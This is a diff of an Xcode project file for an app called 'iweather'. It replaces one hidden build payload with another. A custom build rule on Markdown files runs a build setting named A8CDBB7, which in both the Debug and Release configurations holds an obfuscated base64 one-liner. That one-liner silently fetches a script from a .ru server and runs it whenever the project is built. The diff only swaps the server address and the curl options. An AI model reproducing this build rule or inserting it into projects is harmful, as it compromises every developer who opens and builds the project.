@@ -7,27 +7,28 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		993CC74282224A90B37BBDC8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 79B2670D104040C4987BBDC8 /* README.md */; };
+		0E3668010CE44FEDBA7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = FB5A6AF73E4B42C1977BBDC8; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		1CA43F9452C543A5927BBDC8 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8CDBB7}\"";
-		};
-/* End PBXBuildRule section */
+		4354A1AA9F924825B57BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		79B2670D104040C4987BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		FB5A6AF73E4B42C1977BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8EED036C3032D74E00F68C15 /* iweather.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = iweather.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -61,7 +62,7 @@
 		8EED036D3032D74E00F68C15 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				79B2670D104040C4987BBDC8 /* README.md */,
+				FB5A6AF73E4B42C1977BBDC8 /* README.md */,
 				8EED036C3032D74E00F68C15 /* iweather.app */,
 			);
 			name = Products;
@@ -79,7 +80,7 @@
 				8EED036A3032D74E00F68C15 /* Resources */,
 			);
 			buildRules = (
-				1CA43F9452C543A5927BBDC8 /* PBXBuildRule */,
+				4354A1AA9F924825B57BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -132,7 +133,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				993CC74282224A90B37BBDC8 /* README.md in Resources */,
+				0E3668010CE44FEDBA7BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -152,7 +153,7 @@
 		8EED03753032D74F00F68C15 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtc2tMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf bXase64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgNCAtTGtmcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2wyY3BsLWVtdC5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -217,7 +218,7 @@
 		8EED03763032D74F00F68C15 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ `printf base6H4 | tr -d H` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtc2tMZiAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzZsZHd1ZGdvY2tsMGcyLnJ1L2EpIiB8IHNoCg== | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((m(){ `printf bXase64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgNCAtTGtmcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2wyY3BsLWVtdC5ydS9hKSIgfCBzaAo= | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
